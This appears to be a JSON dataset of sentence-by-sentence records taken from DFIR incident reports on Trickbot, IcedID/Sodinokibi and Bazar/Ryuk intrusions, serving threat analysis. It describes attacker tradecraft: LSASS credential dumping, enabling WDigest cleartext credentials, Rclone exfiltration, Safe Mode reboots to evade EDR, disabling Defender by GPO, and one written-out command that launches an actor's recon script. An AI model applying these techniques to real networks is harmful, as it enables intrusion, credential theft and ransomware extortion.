        "id": "dfir-reports-filtered/r-dfir-32.md:::S16",
        "text": "Lazagne was used with the \u201call\u201d switch, which runs all modules.",
        "type": "",
        "report": "r-dfir-32",
        "line": 16,
        "index": 6640
    },
    {
        "id": "dfir-reports-filtered/r-dfir-32.md:::S17",
        "text": "Below we can see registry hives being saved to disk.\n",
        "type": "",
        "report": "r-dfir-32",
        "line": 17,
        "index": 6641
    },
    {
        "id": "dfir-reports-filtered/r-dfir-32.md:::S18",
        "text": "LSASS was accessed by rundll32, but we did not see anything written to disk.\n",
        "type": "",
        "report": "r-dfir-32",
        "line": 18,
        "index": 6642
    },
    {
        "id": "dfir-reports-filtered/r-dfir-32.md:::S19",
        "text": "Trickbot was used to enable the storage of clear text credentials (WDigest) by setting UseLogonCredential to 1.\n",
        "type": "",
        "report": "r-dfir-32",
        "line": 19,
        "index": 6643
    },
    {
        "id": "dfir-reports-filtered/r-dfir-32.md:::S20",
        "text": "The following net commands were used by the threat actor from the injected Trickbot process.\n",
        "type": "",
        "report": "r-dfir-32",
        "line": 20,
        "index": 6644
    },
    {
        "id": "dfir-reports-filtered/r-dfir-32.md:::S21",
        "text": "The following nltest commands were used by the threat actor from the injected Trickbot process.\n",
        "type": "",
        "report": "r-dfir-32",
        "line": 21,
        "index": 6645
    },
    {
        "id": "dfir-reports-filtered/r-dfir-32.md:::S22",
        "text": "PowerView modules were also used by the threat actor executed from the Cobalt Strike beacons.\n",
        "type": "",
        "report": "r-dfir-32",
        "line": 22,
        "index": 6646
    },
    {
        "id": "dfir-reports-filtered/r-dfir-32.md:::S23",
        "text": "The local network was scanned for port 445/SMB.\n",
        "type": "",
        "report": "r-dfir-32",
        "line": 23,
        "index": 6647
    },
    {
        "id": "dfir-reports-filtered/r-dfir-32.md:::S24",
        "text": "ipconfig was used to show all IP info.\n",
        "type": "",
        "report": "r-dfir-32",
        "line": 24,
        "index": 6648
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S0",
        "text": "The IcedID trojan was first discovered in 2017 and currently operates as an initial access broker for several ransomware families.",
        "type": "",
        "report": "r-dfir-33",
        "line": 0,
        "index": 6649
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S1",
        "text": "In our intrusion, the threat actors leveraged malicious spam using an xlsm document which, upon opening and enabling the macro, initiated a wmic command to execute the IcedID trojan from a remote executable posing as a GIF image.",
        "type": "",
        "report": "r-dfir-33",
        "line": 1,
        "index": 6650
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S2",
        "text": "Persistence was setup using a scheduled task and discovery commands were initiated from the malware within minutes of execution. About an hour and a half after initial access, the malware pulled down Cobalt Strike Beacons from 2 different command and control servers, which were both used through-out the intrusion.",
        "type": "",
        "report": "r-dfir-33",
        "line": 2,
        "index": 6651
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S3",
        "text": "Once the Cobalt Strike Beacons were established, lateral movement began, first to an Exchange server, then pivoting to other servers.",
        "type": "",
        "report": "r-dfir-33",
        "line": 3,
        "index": 6652
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S4",
        "text": "We did not see the attackers interact with the Exchange application at all; and at first, it appeared the attack came from Exchange, but after careful review, we assessed the source was indeed IcedID.",
        "type": "",
        "report": "r-dfir-33",
        "line": 4,
        "index": 6653
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S5",
        "text": "#ArtifactsMatter.",
        "type": "",
        "report": "r-dfir-33",
        "line": 5,
        "index": 6654
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S6",
        "text": "It appears the threat actors wanted us to believe Exchange was the source of attack as they pivoted through Exchange to other systems in the domain using Cobalt Strike.",
        "type": "",
        "report": "r-dfir-33",
        "line": 6,
        "index": 6655
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S7",
        "text": "After compromising the Exchange server, the attackers moved to domain controllers and other systems within the environment using SMB and PowerShell Beacons executed via a remote service.",
        "type": "",
        "report": "r-dfir-33",
        "line": 7,
        "index": 6656
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S8",
        "text": "The attackers were slightly slowed down by AntiVirus, which ate a couple Beacons but the attackers eventually bypassed it using a variation of their lateral movement technique.\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 8,
        "index": 6657
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S9",
        "text": "Additional discovery was executed from the domain controller using AdFind and the Ping utility to test connections between the domain controller and other domain joined systems.",
        "type": "",
        "report": "r-dfir-33",
        "line": 9,
        "index": 6658
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S10",
        "text": "After discovery was completed, credentials were dumped from lsass.",
        "type": "",
        "report": "r-dfir-33",
        "line": 10,
        "index": 6659
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S11",
        "text": "After completing these tasks the threat actors began to establish RDP connections between various systems in the domain.",
        "type": "",
        "report": "r-dfir-33",
        "line": 11,
        "index": 6660
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S12",
        "text": "Three and a half hours into the intrusion, the threat actors used Rclone masquerading as a svchost executable to collect and exfiltrate the contents of network shares for use in a double extortion demand.",
        "type": "",
        "report": "r-dfir-33",
        "line": 12,
        "index": 6661
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S13",
        "text": "At the four hour mark, the threat actors began to move on to final objectives.",
        "type": "",
        "report": "r-dfir-33",
        "line": 13,
        "index": 6662
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S14",
        "text": "They staged the ransomware executable on a domain controller and then used BITSAdmin to download it to each system in the domain.",
        "type": "",
        "report": "r-dfir-33",
        "line": 14,
        "index": 6663
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S15",
        "text": "After that, the threat actors used RDP to open a cmd or PowerShell process to then execute the Sodinokibi ransomware using a particular flag -smode, which when executed, wrote a couple RunOnce registry keys and then immediately rebooted the system into Safe Mode with Networking.",
        "type": "",
        "report": "r-dfir-33",
        "line": 15,
        "index": 6664
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S16",
        "text": "Encryption did not start immediately after reboot but required a user to log in, which in this case the threat actors completed by logging in after the reboot.",
        "type": "",
        "report": "r-dfir-33",
        "line": 16,
        "index": 6665
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S17",
        "text": "Booting into Safe Mode with Networking blocked the startup of security tools and other management agents.",
        "type": "",
        "report": "r-dfir-33",
        "line": 17,
        "index": 6666
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S18",
        "text": "Networking worked, but because services couldn\u2019t start, we were unable to remotely manage the systems using our normal tools.",
        "type": "",
        "report": "r-dfir-33",
        "line": 18,
        "index": 6667
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S19",
        "text": "We believe this process would have stopped some EDR agents from starting up and possibly detecting the ransomware execution.\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 19,
        "index": 6668
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S20",
        "text": "On certain systems, ransomware was executed without the -smode flag, and on other systems a dll was executed via rundll32 to encrypt the system without requiring a reboot and allowing the threat actors to remain present while the encryption process completed.\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 20,
        "index": 6669
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S21",
        "text": "About 4.5 hours after initial access, the threat actors had completed their mission of encrypting all domain joined systems.",
        "type": "",
        "report": "r-dfir-33",
        "line": 21,
        "index": 6670
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S22",
        "text": "The ransomware note left by the infection included a link to their site on Tor which put the price tag for decryption around $200k if paid within 7 days.",
        "type": "",
        "report": "r-dfir-33",
        "line": 22,
        "index": 6671
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S23",
        "text": "If we didn\u2019t pay within 7 days the price goes up to around $400k.",
        "type": "",
        "report": "r-dfir-33",
        "line": 23,
        "index": 6672
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S24",
        "text": "The ransom is required to be paid in Monero instead of the usual Bitcoin.",
        "type": "",
        "report": "r-dfir-33",
        "line": 24,
        "index": 6673
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S25",
        "text": "This may be in an effort to better shield the payments from tracing activity like those performed by Chainaylsis.",
        "type": "",
        "report": "r-dfir-33",
        "line": 25,
        "index": 6674
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S26",
        "text": "The threat actors identified themselves on their site as Sodinokibi and linked to a Coveware blog to provide assurance that if paid their decryption would be successful.\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 26,
        "index": 6675
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S27",
        "text": "Initial access for this intrusion was via a malspam campaign, while expecting Qbot downloads we found that IcedID was the payload choice delivered this time, similar to activity noted recently by James Quinn.",
        "type": "",
        "report": "r-dfir-33",
        "line": 27,
        "index": 6676
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S28",
        "text": "The delivery format was an xlsm file:\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 28,
        "index": 6677
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S29",
        "text": "Initial execution of the document writes a file to:\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 29,
        "index": 6678
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S30",
        "text": "The Excel file called wmic to execute the file with regsrv32\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 30,
        "index": 6679
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S31",
        "text": "This then made a network request to download a file from this URL\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 31,
        "index": 6680
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S32",
        "text": "The GIF however was the IcedID malware.\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 32,
        "index": 6681
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S33",
        "text": "Once IcedID was downloaded to the host, the malware was executed using rundll32.exe\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 33,
        "index": 6682
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S34",
        "text": "After execution, the malware made contact with 161.35.109[.]168 which it continued to beacon to, throughout the intrusion.",
        "type": "",
        "report": "r-dfir-33",
        "line": 34,
        "index": 6683
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S35",
        "text": "IcedID setup persistence on the beach head host using a scheduled task.\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 35,
        "index": 6684
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S36",
        "text": "The execution of the ransomware executable created a RunOnce key for persistence.\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 36,
        "index": 6685
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S37",
        "text": "After completing LDAP discovery (BloodHound), the Cobalt Strike Beacon running in the wuauclt.exe process executed several PowerShell functions for UAC bypasses including:\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 37,
        "index": 6686
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S38",
        "text": "About one and a half hours after initial access, IcedID reached out to two Cobalt Strike servers.",
        "type": "",
        "report": "r-dfir-33",
        "line": 38,
        "index": 6687
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S39",
        "text": "Process injection was used multiple times across the environment using Cobalt Strike Beacons.\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 39,
        "index": 6688
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S40",
        "text": "Prior to executing the ransomware, the threat actors created a GPO to disable Windows Defender across all systems/OUs.\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 40,
        "index": 6689
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S41",
        "text": "The GPO was named \u201cnew\u201d.\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 41,
        "index": 6690
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S42",
        "text": "Credentials were dumped on a server and domain controller using a Cobalt Strike Beacon.\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 42,
        "index": 6691
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S43",
        "text": "Initial discovery by the IcedID malware occurred within minutes of execution:\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 43,
        "index": 6692
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S44",
        "text": "A flurry of LDAP queries were seen coming from wuauclt.exe (Cobalt Strike) on the beachhead.",
        "type": "",
        "report": "r-dfir-33",
        "line": 44,
        "index": 6693
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S45",
        "text": "We believe that activity was related to a Bloodhound scan, as seconds later we see BloodHound results dropped to disk before being deleted.\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 45,
        "index": 6694
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S46",
        "text": "Once on the Exchange server in the environment, the threat actor performed DNS requests for all domain joined systems and pinged a few to check connectivity.",
        "type": "",
        "report": "r-dfir-33",
        "line": 46,
        "index": 6695
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S47",
        "text": "AdFind was executed on a domain controller to gather additional info such as name, OS, and DNS name.\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 47,
        "index": 6696
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S48",
        "text": "For lateral movement, the threat actors used various techniques across the domain, one method being Cobalt Strike.\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 48,
        "index": 6697
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S49",
        "text": "Cobalt Strike Beacon executables were transferred using SMB and executed via a remote service.\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 49,
        "index": 6698
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S50",
        "text": "On other systems, PowerShell was used with the same remote service execution.\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 50,
        "index": 6699
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S51",
        "text": "To facilitate the final ransomware deployment, RDP connections were initiated from a domain controller as well as a secondary server in the environment.\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 51,
        "index": 6700
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S52",
        "text": "The Rclone utility was used to collect information from file shares and to exfiltrate the data.\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 52,
        "index": 6701
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S53",
        "text": "Data that was collected from the domain was exfiltrated to a remote server at:\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 53,
        "index": 6702
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S54",
        "text": "For the final actions, the threat actors dropped a ransomware executable on the domain controller in C:\\Windows and then used BITSAdmin to deploy the executable to remote systems.\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 54,
        "index": 6703
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S55",
        "text": "The -smode flag was used with the ransomware executable to set the system to reboot into Safe Mode with Networking as noted by Malwarehunterteam.\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 55,
        "index": 6704
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S56",
        "text": "Not remember seeing these before in REvil ransomware samples.\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 56,
        "index": 6705
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S57",
        "text": "\ud83e\udd14\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 57,
        "index": 6706
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S58",
        "text": "So basically the actors using REvil now can use it to reboot target machines into safe mode with networking\u2026@demonslay335 @VK_Intel pic.twitter.com/dLk4EirNFO \u2014 MalwareHunterTeam (@malwrhunterteam) March 18, 2021\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 58,
        "index": 6707
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S59",
        "text": "See below for -smode execution:\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 59,
        "index": 6708
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S60",
        "text": "The *franceisshit key was used to boot the machine out of Safe Mode upon restarting the machine.\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 60,
        "index": 6709
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S61",
        "text": "The systems rebooted into Safe Mode with Networking after running this smode command and were left at a login screen.",
        "type": "",
        "report": "r-dfir-33",
        "line": 61,
        "index": 6710
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S62",
        "text": "About 10-20 seconds after logging in, all user files were encrypted and a ransom note was placed in numerous locations including the Desktop.",
        "type": "",
        "report": "r-dfir-33",
        "line": 62,
        "index": 6711
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S63",
        "text": "Services were not able to be started, which led to collection issues, as normal agents did not start.",
        "type": "",
        "report": "r-dfir-33",
        "line": 63,
        "index": 6712
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S64",
        "text": "This also included the startup of EDR and management agents.",
        "type": "",
        "report": "r-dfir-33",
        "line": 64,
        "index": 6713
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S65",
        "text": "We\u2019ve seen at least one tweet about smode setting auto login keys, but we did not see that in our case and were not able to recreate that situation.\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 65,
        "index": 6714
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S66",
        "text": "-smode switch configures OS to boot into safe mode w/ networking via:\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 66,
        "index": 6715
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S67",
        "text": "configures auto-lognn via WinLogon \ud83d\udd11 w/ 'DTrump4ever' password \u2014 R3MRUM (@R3MRUM) March 26, 2021\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 67,
        "index": 6716
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S68",
        "text": "After rebooting out of Safe Mode, you are left with the following desktop:\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 68,
        "index": 6717
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S69",
        "text": "On certain systems, like the domain controllers, the threat actors chose to not use the Safe Mode option, and instead they used a dll executed by rundll32 to encrypt the system with no reboot, allowing the threat actors to maintain access while the ransomware was encrypting files.\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 69,
        "index": 6718
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S70",
        "text": "The threat actors asked for 200k in Monero.",
        "type": "",
        "report": "r-dfir-33",
        "line": 70,
        "index": 6719
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S71",
        "text": "They were talked down 20-30% and could have been talked down more.",
        "type": "",
        "report": "r-dfir-33",
        "line": 71,
        "index": 6720
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S72",
        "text": "Here\u2019s a few screenshots from the website.",
        "type": "",
        "report": "r-dfir-33",
        "line": 72,
        "index": 6721
    },
    {
        "id": "dfir-reports-filtered/r-dfir-33.md:::S73",
        "text": "With the help of @hatching_io (https://tria.ge/) we were able to parse the config from the ransomware sample.\n",
        "type": "",
        "report": "r-dfir-33",
        "line": 73,
        "index": 6722
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S0",
        "text": "In this case we started with a DocuSign themed Excel maldoc.",
        "type": "",
        "report": "r-dfir-34",
        "line": 0,
        "index": 6723
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S1",
        "text": "The excel file failed to bring down the payload but to follow the infection chain we executed the follow on loader.",
        "type": "",
        "report": "r-dfir-34",
        "line": 1,
        "index": 6724
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S2",
        "text": "Once Bazar was established the malware quickly injected into the Werfault process to avoid detection.",
        "type": "",
        "report": "r-dfir-34",
        "line": 2,
        "index": 6725
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S3",
        "text": "As seen in many intrusions the malware then performed some initial discovery with built-in Microsoft utilities such as Nltest.\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 3,
        "index": 6726
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S4",
        "text": "About an hour after initial execution, a Cobalt Strike beacon was loaded, followed shortly by Anchor.",
        "type": "",
        "report": "r-dfir-34",
        "line": 4,
        "index": 6727
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S5",
        "text": "Shortly after Cobalt Strike and Anchor were running, the attackers dumped credentials and began moving laterally, starting with a domain controller.\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 5,
        "index": 6728
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S6",
        "text": "Once on the domain controller, the threat actors ran additional discovery but then went quiet.",
        "type": "",
        "report": "r-dfir-34",
        "line": 6,
        "index": 6729
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S7",
        "text": "Active command and control was maintained by all three malware samples (Bazar, Cobalt Strike, Anchor DNS) over the next 4 days.\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 7,
        "index": 6730
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S8",
        "text": "During that timeframe, honey documents were interacted with and additional discovery scans were executed.",
        "type": "",
        "report": "r-dfir-34",
        "line": 8,
        "index": 6731
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S9",
        "text": "The threat actors were briefly active on day 3 to execute their Get-DataInfo script to collect additional information, which is usually followed closely by Ryuk ransomware.\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 9,
        "index": 6732
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S10",
        "text": "However, on the fifth day the threat actors access was cut off before final objectives could be accomplished.",
        "type": "",
        "report": "r-dfir-34",
        "line": 10,
        "index": 6733
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S11",
        "text": "We assess that the end goal of this intrusion was to execute domain wide ransomware.\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 11,
        "index": 6734
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S12",
        "text": "A DocuSign themed Excel xls was opened and macros were enabled.",
        "type": "",
        "report": "r-dfir-34",
        "line": 12,
        "index": 6735
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S13",
        "text": "Thanks to @ffforward for the document as well as the sandbox run leading up to the xls file.\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 13,
        "index": 6736
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S14",
        "text": "The macro in this maldoc is using Excel 4 Macros.\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 14,
        "index": 6737
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S15",
        "text": "DocuSign was again the social engineering format of choice.\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 15,
        "index": 6738
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S16",
        "text": "After execution, Excel called out to:\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 16,
        "index": 6739
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S17",
        "text": "We saw no further follow on activity from the above execution, potentiality due to the loader site being offline or some other condition not being met.",
        "type": "",
        "report": "r-dfir-34",
        "line": 17,
        "index": 6740
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S18",
        "text": "We then executed the follow on malware manually.\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 18,
        "index": 6741
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S19",
        "text": "About an hour after execution of the above Bazar Loader, Cobalt Strike was executed by the injected Werfault process.\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 19,
        "index": 6742
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S20",
        "text": "Shortly after Cobalt Strike was executed, it dropped several Anchor executable files.\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 20,
        "index": 6743
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S21",
        "text": "AnchorDns was then executed via Cobalt Strike which called cmd and then anchorAsjuster.",
        "type": "",
        "report": "r-dfir-34",
        "line": 21,
        "index": 6744
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S22",
        "text": "Notice Asjuster passing two domains to anchor_x64.exe which will be used for C2.\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 22,
        "index": 6745
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S23",
        "text": "Bazar quickly moved into a Werfault process to handle command and control communication avoiding making any network connections directly.\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 23,
        "index": 6746
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S24",
        "text": "Process injection was also seen in other key system executables such as winlogon.exe.\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 24,
        "index": 6747
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S25",
        "text": "Cobalt Strike was seen locking access to SMB beacons.\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 25,
        "index": 6748
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S26",
        "text": "Anchor was also seen triggering process tampering.\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 26,
        "index": 6749
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S27",
        "text": "The threat actors were seen using remote thread creation to inject into lsass to extract credentials.",
        "type": "",
        "report": "r-dfir-34",
        "line": 27,
        "index": 6750
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S28",
        "text": "The same activity as seen via a the larger process tree.\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 28,
        "index": 6751
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S29",
        "text": "Bazar initiated some discovery activity within 10 minutes of executing.\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 29,
        "index": 6752
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S30",
        "text": "Cobalt Strike initiated the following discovery commands:\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 30,
        "index": 6753
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S31",
        "text": "On the domain controller the following discovery was run:\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 31,
        "index": 6754
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S32",
        "text": "The following PowerShell command was executed from the domain controller.\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 32,
        "index": 6755
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S33",
        "text": "Systems were pinged from the domain controller to confirm connectivity.\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 33,
        "index": 6756
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S34",
        "text": "Four days into the intrusion the threat actors dropped and executed Advanced_IP_Scanner_2.5.3850.exe which kicked off a scan of the network.\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 34,
        "index": 6757
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S35",
        "text": "AWS was used to get the public IP of the infected machine, multiple times.\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 35,
        "index": 6758
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S36",
        "text": "Minutes before deployment of Ryuk the threat actors usually drop the following files, usually on a domain controller.",
        "type": "",
        "report": "r-dfir-34",
        "line": 36,
        "index": 6759
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S37",
        "text": "This time they dropped the files on a domain controller in C:\\info\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 37,
        "index": 6760
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S38",
        "text": "The exact files were mentioned in our Bazar, No Ryuk report.",
        "type": "",
        "report": "r-dfir-34",
        "line": 38,
        "index": 6761
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S39",
        "text": "start.bat was executed with the following:\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 39,
        "index": 6762
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S40",
        "text": "C:\\Windows\\system32\\cmd.exe /c \"\"C:\\info\\start.bat\"\"",
        "type": "",
        "report": "r-dfir-34",
        "line": 40,
        "index": 6763
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S41",
        "text": "This script contents show it to be a wrapper for the PowerShell script Get-DataInfo.ps1 The contents of Get-DataInfo.ps1 show a detailed information collector to provide the threat actor with very specific details of the environment.",
        "type": "",
        "report": "r-dfir-34",
        "line": 41,
        "index": 6764
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S42",
        "text": "This includes things like disk size, connectivity, antivirus software, and backup software.",
        "type": "",
        "report": "r-dfir-34",
        "line": 42,
        "index": 6765
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S43",
        "text": "The Ryuk group has used this script for at least a year as we\u2019ve seen them use it multiple times.",
        "type": "",
        "report": "r-dfir-34",
        "line": 43,
        "index": 6766
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S44",
        "text": "This script and files are available @ https://thedfirreport.com/services/\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 44,
        "index": 6767
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S45",
        "text": "Two hours post initial access the threat actors began lateral movement to one of the domain controllers using PowerShell, which was executed via a remote service, which launched Cobalt Strike\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 45,
        "index": 6768
